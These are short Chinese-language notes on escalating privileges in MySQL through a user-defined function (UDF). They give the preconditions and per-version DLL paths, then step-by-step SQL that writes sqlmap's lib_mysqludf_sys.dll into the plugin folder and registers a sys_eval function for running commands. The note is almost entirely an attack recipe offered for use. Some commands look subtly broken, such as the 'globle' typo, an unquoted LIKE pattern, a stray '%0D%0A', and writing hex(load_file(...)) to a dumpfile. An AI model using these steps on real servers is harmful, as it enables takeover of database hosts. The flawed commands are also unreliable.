# udf提权
利用条件:
```
1.mysql配置文件secure_file_priv项设置为空，（如果为NULL或/tmp/等指定目录，即无法自定义udf文件导出位置，则无法利用）；

1.CREATE权限、FILE权限（root用户默认拥有所有权限）。

特殊情况：
2.INSERT权限、UPDATE权限、DELETE权限。
```
版本区别
```
Mysql版本大于5.1，udf.dll文件必须放在MySQL安装目录的lib\plugin文件夹下。（plugin文件夹默认不存在，需要创建）。

Mysql版本小于5.1：%0D%0A如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\Winnt\udf.dll 下。

如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\Windows\udf.dll 下。
```
[udf-pri-evl](https://blog.csdn.net/qq_44159028/article/details/121193134)



```
查看权限
show globle variables like %secure%;

查看plugin文件位置
SHOW VARIABLES LIKE 'plugin_dir'

上传UDF动态连接库文件
select hex(load_file('D:\\02-Hacking_Tools\\02-vuln-exploit\\sqlmap\\extra\\cloak\\lib_mysqludf_sys.dll')) into dumpfile 'E:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll';
#ps：这里windows下目录结构要进行转义双写


创建自定义函数
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
查看自定义函数是否写入
select * from mysql.func;
```